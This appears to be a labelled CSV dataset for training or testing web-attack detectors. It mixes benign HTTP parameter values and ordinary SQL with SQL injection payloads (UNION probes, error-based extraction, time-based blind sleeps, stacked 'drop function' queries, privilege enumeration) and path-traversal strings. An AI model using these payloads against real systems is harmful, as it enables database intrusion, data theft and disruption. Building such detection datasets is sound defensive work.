payload,attack_type,is_attack,source
SELECT AVG ( Price ) FROM sail,norm,0,SQLiV3
jeanhee,norm,0,HttpParamsDataset
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",sqli,1,SQLiV3
vilar elsegui,norm,0,HttpParamsDataset
ilday,norm,0,HttpParamsDataset
SELECT TOP 3 * FROM theory WHERE friendly = 'he',norm,0,SQLiV3
1446991809597037,norm,0,HttpParamsDataset
"1%"" union all select null,null--",sqli,1,HttpParamsDataset
1342i3,norm,0,HttpParamsDataset
1534175885053234,norm,0,HttpParamsDataset
8412575121393763,norm,0,HttpParamsDataset
1);select (case when (6435=8988) then 6435 else 6435*(select 6435 from information_schema.character_sets) end)#,sqli,1,HttpParamsDataset
"1'||(select 'sned' where 4957=4957 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,HttpParamsDataset
"1"") as doai where 7024=7024 union all select null,null,null,null,null,null,null,null--",sqli,1,HttpParamsDataset
m01vi3,norm,0,HttpParamsDataset
"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",sqli,1,SQLiV3
SELECT catch ( s )  FROM instant FULL OUTER JOIN,norm,0,SQLiV3
"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",sqli,1,SQLiV3
"-6770"" or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)",sqli,1,HttpParamsDataset
1)));begin user_lock.sleep(5); end--,sqli,1,HttpParamsDataset
1'  )   as mwpp where 6192  =  6192,sqli,1,SQLiV3
39152269j,norm,0,HttpParamsDataset
"1"" and   (  3020  =  3020  )  *6703 and ""tnzp"" like ""tnzp",sqli,1,SQLiV3
"calle playa del carmen, 178, 2?d",norm,0,HttpParamsDataset
1840,norm,0,HttpParamsDataset
26111,norm,0,HttpParamsDataset
1%')));select (case when (5752=6036) then 1 else 5752*(select 5752 from master..sysdatabases) end)--,sqli,1,HttpParamsDataset
ayen,norm,0,HttpParamsDataset
1') as rbpx where 1264=1264;begin dbms_lock.sleep(5); end--,sqli,1,HttpParamsDataset
pizcar,norm,0,HttpParamsDataset
"1"") as vpna where 5450=5450 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,HttpParamsDataset
FROM  ( SELECT DISTINCT shine FROM farmer ) ,norm,0,SQLiV3
SELECT AVG ( Price ) FROM which,norm,0,SQLiV3
wee-seng,norm,0,HttpParamsDataset
1'+(select enzd where 6046=6046 and (3020=3020)*6703)+',sqli,1,HttpParamsDataset
"1"" where 4808=4808 union all select null,null,null,null,null,null,null#",sqli,1,HttpParamsDataset
calamocha,norm,0,HttpParamsDataset
SELECT * FROM bell WHERE sheep = 'accurate'  AND  ( steel = 'drive' OR column = 'mouth' ) ,norm,0,SQLiV3
00041731d,norm,0,HttpParamsDataset
lihul,norm,0,HttpParamsDataset
"-1258""   )    )    union all select 7734,7734,7734#",sqli,1,SQLiV3
"-7433"")) as zsnt where 2513=2513 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,1,HttpParamsDataset
3e43a01n8,norm,0,HttpParamsDataset
"-3587') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('psqt' like 'psqt",sqli,1,HttpParamsDataset
7553,norm,0,HttpParamsDataset
1' in boolean mode  )   order by 1#,sqli,1,SQLiV3
5128322398230292,norm,0,HttpParamsDataset
16370,norm,0,HttpParamsDataset
SELECT AVG ( know ) FROM toward,norm,0,SQLiV3
"1""))) and 7153=7474--",sqli,1,HttpParamsDataset
admin' --,sqli,1,SQLiV3
1' where 6583=6583;select case when 4537=8418 then 1 else null end--,sqli,1,HttpParamsDataset
SELECT * FROM measure WHERE burn = 'pretty' LIMIT 3,norm,0,SQLiV3
"1) as dqda where 1624=1624 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,HttpParamsDataset
SELECT * FROM greater WHERE Price NOT BETWEEN 10 AND 20,norm,0,SQLiV3
atherton@madrid2012.ht,norm,0,HttpParamsDataset
offers,norm,0,HttpParamsDataset
-4684  )   as uqjn where 4550  =  4550 or 1689  =  5825,sqli,1,SQLiV3
/..///{file},path-traversal,1,HttpParamsDataset
SELECT * FROM doll FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
2243286657629383,norm,0,HttpParamsDataset
1'   )    )    as pqbq where 1865  =  1865,sqli,1,SQLiV3
8664,norm,0,HttpParamsDataset
SELECT * FROM near WHERE    NOT eager = 'body',norm,0,SQLiV3
 )   or   (  'a'  =  'a,sqli,1,SQLiV3
SELECT large,norm,0,SQLiV3
"1""   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""bfko""  =  ""bfko",sqli,1,SQLiV3
SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLY,norm,0,SQLiV3
"1""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""atlz""=""atlz",sqli,1,HttpParamsDataset
" SELECT * FROM along ORDER BY available, so",norm,0,SQLiV3
1611608298925836,norm,0,HttpParamsDataset
"   SELECT Employees.can, COUNT ( Orders.afterID )  AS meanFROM    ( OrdersINNER JOIN husband ON Orders.longID  =  Employees.copyID ) ",norm,0,SQLiV3
SELECT * FROM sides WHERE speech = 'hole' LIMIT 3,norm,0,SQLiV3
"1""  )   where 5065  =  5065",sqli,1,SQLiV3
"1"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""dsae""=""dsae",sqli,1,HttpParamsDataset
" SELECT column_name ( s )  FROM describe,came",norm,0,SQLiV3
SELECT * FROM flew WHERE flame NOT LIKE 'of%',norm,0,SQLiV3
SELECT * FROM forth WHERE lay = 'along'  OR diagram = 'rich',norm,0,SQLiV3
57471201c,norm,0,HttpParamsDataset
"-3952') union all select 6644,6644,6644--",sqli,1,HttpParamsDataset
"-3721'  )   union all select 9050,9050--",sqli,1,SQLiV3
3099595340897586,norm,0,HttpParamsDataset
end and    (    (   'zlsq'  =  'zlsq,sqli,1,SQLiV3
1279724517252177,norm,0,HttpParamsDataset
0277189059505279,norm,0,HttpParamsDataset
SELECT * FROM consist WHERE add BETWEEN 'example' AND 'birthday',norm,0,SQLiV3
"   SELECT individual, decide, milkFROM deeply WHERE citizen  IS NOT NULL",norm,0,SQLiV3
"1"") where 6821=6821 waitfor delay '0:0:5'--",sqli,1,HttpParamsDataset
SELECT TOP 50 PERCENT * FROM walk SELECT * FROM shelf FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM proud,norm,0,SQLiV3
"1%');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('%'='",sqli,1,HttpParamsDataset
3oque70,norm,0,HttpParamsDataset
"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,sqli,1,SQLiV3
"1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",sqli,1,HttpParamsDataset
pche,norm,0,HttpParamsDataset
"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",sqli,1,SQLiV3
"-7764"" or 7308  =  7805",sqli,1,SQLiV3
song@eyewear.nom.aw,norm,0,HttpParamsDataset
end and    (    (     (  3673  =  3673,sqli,1,SQLiV3
"1'   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'vtno'  =  'vtno",sqli,1,SQLiV3
"1 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,HttpParamsDataset
pea barnera,norm,0,HttpParamsDataset
sanlcar la mayor,norm,0,HttpParamsDataset
"1 where 1153  =  1153 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",sqli,1,SQLiV3
SELECT Count ( * )  AS basket,norm,0,SQLiV3
8837,norm,0,HttpParamsDataset
SELECT TOP 3 * FROM structure WHERE oldest = 'needs',norm,0,SQLiV3
SELECT certainly ( s FROM hurt RIGHT JOIN,norm,0,SQLiV3
33773632h,norm,0,HttpParamsDataset
SELECT COUNT ( opinion ) FROM pig,norm,0,SQLiV3
"1'+  (  select 'pgje' where 4658  =  4658 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,SQLiV3
torcuarto,norm,0,HttpParamsDataset
SELECT AVG ( official ) FROM body,norm,0,SQLiV3
3013,norm,0,HttpParamsDataset
SELECT * FROM discover  WHERE every = married,norm,0,SQLiV3
7549,norm,0,HttpParamsDataset
-6178)) as lygb where 9559=9559 or (8459=8459)*4906--,sqli,1,HttpParamsDataset
"-9087"" order by 1#",sqli,1,HttpParamsDataset
edlund@cementoscalibra.yu,norm,0,HttpParamsDataset
"SELECT * FROM accurate WHERE age BETWEEN ""sat"" AND    ""basis""",norm,0,SQLiV3
cambre@beesmer.na,norm,0,HttpParamsDataset
iriyuy,norm,0,HttpParamsDataset
1  )   where 7552  =  7552 order by 1#,sqli,1,SQLiV3
1') rlike sleep(5) and ('boto'='boto,sqli,1,HttpParamsDataset
"  SELECT without AS settle, her AS [mile]  FROM tip",norm,0,SQLiV3
"1'   )    )    as ezpq where 2976  =  2976 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,SQLiV3
86a7o,norm,0,HttpParamsDataset
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sqli,1,SQLiV3
lester_muenster@erasmusrooms.org,norm,0,HttpParamsDataset
rubio,norm,0,HttpParamsDataset
gumersindo,norm,0,HttpParamsDataset
"1%"")));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,HttpParamsDataset
"1"")) as mlid where 1047=1047 union all select null,null#",sqli,1,HttpParamsDataset
-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv,sqli,1,SQLiV3
"1  )   as lejp where 5238  =  5238 union all select null,null,null,null,null#",sqli,1,SQLiV3
"-5757%""  )   or 6872  =  6872 and   (  ""%""  =  """,sqli,1,SQLiV3
40389675l,norm,0,HttpParamsDataset
"1') or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,HttpParamsDataset
"-4543"") or 3038=3038",sqli,1,HttpParamsDataset
50604841b,norm,0,HttpParamsDataset
1'   )    )    as fqia where 1936  =  1936 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,sqli,1,SQLiV3
"-4739')) union all select 6585,6585,6585,6585,6585--",sqli,1,HttpParamsDataset
ronna,norm,0,HttpParamsDataset
""" or 1  =  1--",sqli,1,SQLiV3
"fierro 66, 3?e",norm,0,HttpParamsDataset
papa@opel-e-flex.cg,norm,0,HttpParamsDataset
frambueso,norm,0,HttpParamsDataset
"1',  (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",sqli,1,SQLiV3
"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",sqli,1,SQLiV3
0213218776616277,norm,0,HttpParamsDataset
sabiela,norm,0,HttpParamsDataset
"1"" where 4450=4450 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,HttpParamsDataset
"-6611%""   )    )     )   union all select 8918,8918#",sqli,1,SQLiV3
"1   )    )    and elt  (  9288  =  6067,6067  )   and    (    (   1895  =  1895",sqli,1,SQLiV3
SELECT TOP 3 * FROM popular WHERE blow = 'scared',norm,0,SQLiV3
"almendro, 28 6?c",norm,0,HttpParamsDataset
78590398l,norm,0,HttpParamsDataset
"1   )    )    union all select null,null,null,null,null,null#",sqli,1,SQLiV3
8578275476079932,norm,0,HttpParamsDataset
kirkpatr,norm,0,HttpParamsDataset
SELECT MIN ( hung )  AS shaking FROM breakfast,norm,0,SQLiV3
2813,norm,0,HttpParamsDataset
"etorbidea askatasuna 170, 8?a",norm,0,HttpParamsDataset
"1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu",sqli,1,SQLiV3
SELECT * FROM oil WHERE modern = 'quiet'  OR mirror = 'him',norm,0,SQLiV3
8737153386823279,norm,0,HttpParamsDataset
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",sqli,1,SQLiV3
"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cbwx'  =  'cbwx",sqli,1,SQLiV3
41992996x,norm,0,HttpParamsDataset
"  SELECT until,bill FROM chamber WHERE system = 'voice' UNION SELECT only, pay FROM battle",norm,0,SQLiV3
"1%""));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,HttpParamsDataset
almorejo,norm,0,HttpParamsDataset
8762160000000000,norm,0,SQLiV3
"-4031""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""auhn""  =  ""auhn",sqli,1,SQLiV3
garcilln,norm,0,HttpParamsDataset
"1"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""hhwy""=""hhwy",sqli,1,HttpParamsDataset
mordi3nt-e,norm,0,HttpParamsDataset
1');if(7899=7899) select 7899 else drop function zbbp--,sqli,1,HttpParamsDataset
"1'+  (  select 'dbvq' where 2045  =  2045 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",sqli,1,SQLiV3
caterina,norm,0,HttpParamsDataset
"1') union all select null,null,null,null,null,null,null,null,null#",sqli,1,HttpParamsDataset
"1'  )   as uvxl where 6211  =  6211 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",sqli,1,SQLiV3
rainelda,norm,0,HttpParamsDataset
SELECT COUNT ( DISTINCT purple )  FROM even,norm,0,SQLiV3
1'   )    )     )   and 7533  =  7533 and    (    (     (  'hoyw'  =  'hoyw,sqli,1,SQLiV3
if  (  8537  =  7034  )   select 8537 else drop function vqmp--,sqli,1,SQLiV3
"calle padre arintero, 149",norm,0,HttpParamsDataset
7656,norm,0,HttpParamsDataset
simplemente,norm,0,HttpParamsDataset
SELECT * FROM yet WHERE point NOT LIKE 'breeze%',norm,0,SQLiV3
67718883y,norm,0,HttpParamsDataset
06390,norm,0,HttpParamsDataset
SELECT * FROM outer WHERE great BETWEEN doing09/01/1996kind AND image15/31/1996oxygen,norm,0,SQLiV3
"1%"")));select case when 7717=7717 then 1 else null end--",sqli,1,HttpParamsDataset
5076820000000000,norm,0,SQLiV3
"1'||  (  select 'xjcg' from dual where 5815  =  5815 union all select null,null,null#",sqli,1,SQLiV3
SELECT * FROM planned  WHERE cabin = congress,norm,0,SQLiV3
gaudencio,norm,0,HttpParamsDataset
cecchini_polonsky@iurispretor.info,norm,0,HttpParamsDataset
1   )    )    as eigk where 2557  =  2557,sqli,1,SQLiV3
0085184895968394,norm,0,HttpParamsDataset
" SELECT column_name ( s )  FROM connected,purple",norm,0,SQLiV3
"1""))) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,HttpParamsDataset
"  (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",sqli,1,SQLiV3
6ca2o,norm,0,HttpParamsDataset
SELECT * FROM molecular WHERE    NOT put = 'nest',norm,0,SQLiV3
SELECT TOP 3 * FROM drink WHERE house = 'rear' SELECT * FROM himself,norm,0,SQLiV3
DELETE FROM attached WHERE friendly = 'level',norm,0,SQLiV3
calle gurugu 142 4?d,norm,0,HttpParamsDataset
cella,norm,0,HttpParamsDataset
"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",sqli,1,SQLiV3
periodista jose ventura traveset 4 5b,norm,0,HttpParamsDataset
SELECT * FROM vegetable WHERE purpose = 'canal'  OR last = 'paint',norm,0,SQLiV3
"1 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",sqli,1,SQLiV3
"1""   )    )    union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,SQLiV3
"1""  )   as hfvz where 7186  =  7186 union all select null,null,null,null,null,null#",sqli,1,SQLiV3
tudanca huitron,norm,0,HttpParamsDataset
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239190 )  ORDER BY meta_id ASC",norm,0,SQLiV3
kit,norm,0,HttpParamsDataset
"1)) as wezj where 2869=2869 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,HttpParamsDataset
7265260392335726,norm,0,HttpParamsDataset
"1  )   where 1880  =  1880 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",sqli,1,SQLiV3
"1)) as henn where 9980=9980 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,HttpParamsDataset
00916150z,norm,0,HttpParamsDataset
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..{file},path-traversal,1,HttpParamsDataset
1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,sqli,1,SQLiV3
"1') where 6056=6056 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",sqli,1,HttpParamsDataset
SELECT TOP 3 * FROM consist WHERE pour = 'kept' SELECT * FROM whether,norm,0,SQLiV3
"1"" where 7045=7045;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,HttpParamsDataset
chatri1,norm,0,HttpParamsDataset
"c/ jardins de caterina albert 149,",norm,0,HttpParamsDataset
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28313 )  ORDER BY meta_id ASC",norm,0,SQLiV3
SELECT * FROM angry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM search,norm,0,SQLiV3
"INSERT INTO we  ( parts, held, gasoline )  VALUES  ( 'diameter', 'police', 'doll' )  ",norm,0,SQLiV3
82634246f,norm,0,HttpParamsDataset
if  (  3593  =  3779  )   select 3593 else drop function qtqy--,sqli,1,SQLiV3
-4082   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   7874  =  7874,sqli,1,SQLiV3
schadan,norm,0,HttpParamsDataset
"  SELECT cat,pour,bark FROM father LEFT JOIN Orders ON changing.becauseID =  fast.steep ORDER BY child.label",norm,0,SQLiV3
"-4350"")) as mmwq where 9801=9801 or (8520=2834)*2834--",sqli,1,HttpParamsDataset
SELECT * FROM property WHERE save = 'condition',norm,0,SQLiV3
1') as lewd where 3118=3118 order by 1--,sqli,1,HttpParamsDataset
if  (  2695  =  9045  )   select 2695 else drop function qmno--,sqli,1,SQLiV3
alargamiento,norm,0,HttpParamsDataset
SELECT * FROM alive,norm,0,SQLiV3
la_verne,norm,0,HttpParamsDataset
1 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,sqli,1,SQLiV3
select pg_sleep  (  5   )    )   ||',sqli,1,SQLiV3
"1"" where 2235  =  2235 union all select null,null,null,null,null--",sqli,1,SQLiV3
"c/ venecia, s/n,",norm,0,HttpParamsDataset
"1""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  ""cjkk"" like ""cjkk",sqli,1,SQLiV3
"1"") where 7548=7548;select sleep(5)--",sqli,1,HttpParamsDataset
e6tal1g68,norm,0,HttpParamsDataset
SELECT TOP 3 * FROM mark SELECT * FROM raw 3SELECT * FROM bill,norm,0,SQLiV3
"1'+(select jqyo where 4426=4426 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))+'",sqli,1,HttpParamsDataset
"1') as ccee where 8880=8880 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,HttpParamsDataset
94318165h,norm,0,HttpParamsDataset
SELECT TOP 50 PERCENT * FROM remember,norm,0,SQLiV3
-2210' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'myvr' like 'myvr,sqli,1,SQLiV3
"calle arfian 36,",norm,0,HttpParamsDataset
c/ sahagun 142,norm,0,HttpParamsDataset
"INSERT INTO apple ( difference, bat, jungle, including, circle, today )  VALUES  ( 'title', 'repeat'. end', 'let', 'floating', 'explore', 'tax' )  ",norm,0,SQLiV3
3880938788805170,norm,0,HttpParamsDataset
"  SELECT afterID AS ID, having AS fruit FROM partly",norm,0,SQLiV3
SELECT * FROM substance FETCH FIRST 50 PERCENT ROWS ONLY,norm,0,SQLiV3
"-6760 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# ikqw",sqli,1,HttpParamsDataset
SELECT * FROM job WHERE soap = 'what'  AND City = 'chose',norm,0,SQLiV3
68689912k,norm,0,HttpParamsDataset
riguier_waits3@copiar.com.gl,norm,0,HttpParamsDataset
SELECT COUNT ( growth ) FROM soil,norm,0,SQLiV3
*',sqli,1,SQLiV3
1'||(select 'zeet' from dual where 9567=9567 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,HttpParamsDataset
385057000000000,norm,0,SQLiV3
"1' where 9116  =  9116 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli,1,SQLiV3
mquina,norm,0,HttpParamsDataset
1380670000000000,norm,0,SQLiV3
"1' where 9605=9605 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,HttpParamsDataset
"pl. san marcial 90, 13-e",norm,0,HttpParamsDataset
